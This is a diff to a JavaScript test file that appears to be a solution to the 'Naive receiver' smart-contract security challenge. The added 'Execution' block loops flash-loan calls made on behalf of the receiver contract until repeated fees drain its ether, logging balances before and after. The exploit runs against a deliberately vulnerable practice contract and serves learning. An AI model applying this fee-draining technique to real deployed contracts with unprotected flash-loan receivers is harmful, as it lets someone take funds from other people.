@@ -29,7 +29,7 @@ describe('[Challenge] Naive receiver', function () {
         receiver = await FlashLoanReceiverFactory.deploy(pool.address);
         await deployer.sendTransaction({ to: receiver.address, value: ETHER_IN_RECEIVER });
         await expect(
-            receiver.onFlashLoan(deployer.address, ETH, ETHER_IN_RECEIVER, 10n**18n, "0x")
+         receiver.onFlashLoan(deployer.address, ETH, ETHER_IN_RECEIVER, 10n**18n, "0x")
         ).to.be.reverted;
         expect(
             await ethers.provider.getBalance(receiver.address)
@@ -38,6 +38,17 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        console.log('Balance anterior')
+        console.log('Receiber: ',(await ethers.provider.getBalance(receiver.address)).toString());
+        console.log('Pool:',(await ethers.provider.getBalance(pool.address)).toString());
+        const ETH = await pool.ETH();
+
+        while(await ethers.provider.getBalance(receiver.address)>=10n ** 18n ){
+            const tx = await pool.flashLoan(receiver.address, ETH, 10n**18n, "0x" );
+        }
+
+        console.log('Receiber: ',(await ethers.provider.getBalance(receiver.address)).toString());
+        console.log('Pool: ',(await ethers.provider.getBalance(pool.address)).toString());
     });
 
     after(async function () {
